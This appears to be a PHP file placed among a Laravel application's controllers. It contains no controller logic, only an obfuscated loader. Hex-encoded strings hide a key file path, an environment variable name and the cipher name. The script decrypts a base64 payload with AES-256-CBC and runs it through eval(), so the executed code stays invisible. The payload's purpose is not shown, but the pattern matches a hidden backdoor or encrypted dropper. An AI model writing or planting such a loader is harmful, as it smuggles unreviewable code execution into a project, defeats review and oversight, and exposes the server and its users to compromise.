<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lxgsszvovVzSI+dJX34F/w==');

$c=base64_decode(

'o0qKyYP4XX3bbJFxUk/r6eC3FN8LqdYAD3oHJKWDkh2vqIM1F8dJDD/XtNlIOB1uL+JDNELDeE5E' .
'8jZI7ul9lIdQEIAHm2HponllOdhjZb3R1PlGG7uxmZkA5EkL4O+b5+iWdqm4JvOCPWIBaeMTuCuc' .
'KUlS9vpZKa0hlgOXwPRk4UO+b4Mu2x7/g3Ewg5/toFZeeHFue6mYoL9awujKXiZVnxyJoSEQXEX/' .
'QVtdsopHbHUvcW6bvimBjKxuxIha'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

